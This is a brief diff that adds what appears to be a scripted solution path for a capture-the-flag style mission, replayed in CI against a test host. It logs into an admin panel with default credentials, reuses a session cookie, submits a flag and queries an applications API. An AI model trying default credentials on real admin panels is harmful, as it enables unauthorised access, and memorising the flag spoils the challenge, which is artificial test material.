@@ -1,0 +1,7 @@
+# Case file 43, mission 1: the shortest path, replayed by CI in every language.
+curl -s https://admin.cordee.test/
+curl -d "user=123456 password=123456" https://admin.cordee.test/login
+curl -b "session=cd-recette-0042" https://admin.cordee.test/dashboard
+submit FLAG{serin-recette-2019-a7c4}
+curl -b "session=cd-recette-0042" https://admin.cordee.test/api/applications/64185402
+answer report
